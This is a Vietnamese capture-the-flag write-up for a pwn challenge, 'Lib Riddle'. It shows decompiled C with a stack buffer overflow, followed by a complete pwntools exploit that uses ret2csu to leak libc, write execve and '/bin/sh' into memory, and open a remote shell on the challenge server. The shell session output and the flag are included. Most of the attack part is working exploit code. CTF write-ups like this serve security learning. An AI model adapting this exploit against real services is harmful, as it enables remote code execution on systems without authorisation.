# Lib Riddle
## Analysis
Lỗi buffer overflow
```
undefined8 main(void) {
  char local_18 [16];
  
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts("Welcome to the library... What\'s your name?");
  read(0,local_18,0x100);
  puts("Hello there: ");
  puts(local_18);
  return 0;
}
```
## Solution
Tuy chỉ cần pop shell bằng ret2libc nhưng do vừa học kỹ thuật ret2csu nên tôi quyết định thử ngay cho nóng =D
```
#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./challenge_patched", checksec = False)
# libc tìm được sau khi đã leak địa chỉ các hàm
libc = ELF("./libc6_2.31-0ubuntu9.14_amd64.so", checksec = False)

con = remote("34.125.199.248", 7809)

part1 = 0x0040126a
part2 = 0x00401250     
rw = 0x4040f0
ret = 0x401203

### Stage 1: leak libc
payload = b"A"*0x18
payload += p64(part1) + p64(0) + p64(1) + p64(elf.got['puts']) + p64(0) + p64(0) + p64(elf.got['puts'])
payload += p64(part2) + p64(0)*7 + p64(elf.sym['main'])
con.sendlineafter(b"What's your name?\n", payload)
con.recvline()
con.recvline()
puts_leak = u64(con.recv(6)+b"\0\0")
log.info(hex(puts_leak))
libc.address = puts_leak - libc.sym['puts']
log.info(hex(libc.address))

### Stage 2: Write binsh and execve func to rw section
payload = b"A"*0x18
payload += p64(part1) + p64(0) + p64(1) + p64(0) + p64(rw) + p64(0x200) + p64(elf.got['read'])
payload += p64(part2) + p64(0)*7 + p64(elf.sym['main'])
con.sendlineafter(b"What's your name?\n", payload)
time.sleep(1)
con.send(p64(libc.sym['execve']))

payload = b"A"*0x18
payload += p64(part1) + p64(0) + p64(1) + p64(0) + p64(rw+0x20) + p64(0x200) + p64(elf.got['read'])
payload += p64(part2) + p64(0)*7 + p64(elf.sym['main'])
con.sendlineafter(b"What's your name?\n", payload)
time.sleep(1)
con.send(b'/bin/sh\x00')

### Stage 3: Get shell
payload = b"A"*0x18
payload += p64(part1) + p64(0) + p64(1) + p64(rw+0x20) + p64(0) + p64(0) + p64(rw)
payload += p64(part2)
con.sendlineafter(b"What's your name?\n", payload)

con.interactive()
```
```
└─$ ./exp.py
[+] Opening connection to 34.125.199.248 on port 7809: Done
[*] 0x7ffff7e57420
[*] 0x7ffff7dd3000
[*] Switching to interactive mode
Hello there:
AAAAAAAAAAAAAAAAAAAAAAAAj\x12@
$ ls
bin
boot
dev
etc
home
...
```
## Flag
```
OSCTF{l1br4ry_m4de_0f_5y5call5}
```